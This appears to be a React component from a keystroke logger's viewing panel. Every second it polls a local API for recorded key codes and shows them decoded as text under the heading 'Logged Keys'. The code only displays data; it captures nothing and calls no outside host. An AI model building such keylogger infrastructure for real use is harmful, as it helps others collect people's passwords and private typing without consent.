import { useEffect, useState } from 'react';

export default function View() {
  const [data, setData] = useState([]);

  useEffect(() => {
    const fetchKeys = async () => {
      try {
        const res = await fetch("/api/data");
        const json = await res.json();
        if (Array.isArray(json)) {
          setData(json);
        } else {
          console.error("Unexpected API response:", json);
        }
      } catch (err) {
        console.error("Fetch error:", err);
      }
    };

    fetchKeys();
    const interval = setInterval(fetchKeys, 1000);
    return () => clearInterval(interval);
  }, []);

  const decodeKey = (code) => {
    if (code === 13) return "[Enter]";
    if (code === 32) return " ";
    if (code === 8) return "[Backspace]";
    if (code < 32 || code > 126) return `[${code}]`;
    return String.fromCharCode(code);
  };

  return (
    <div style={{
      backgroundColor: "#fff",
      minHeight: "100vh",
      padding: "2rem",
      color: "#111",
      fontFamily: "monospace",
      fontSize: "1.5rem"
    }}>
      <h1>Logged Keys</h1>
      <div>
        {data.map((code, index) => (
          <span key={index}>{decodeKey(code)}</span>
        ))}
      </div>
    </div>
  );
}
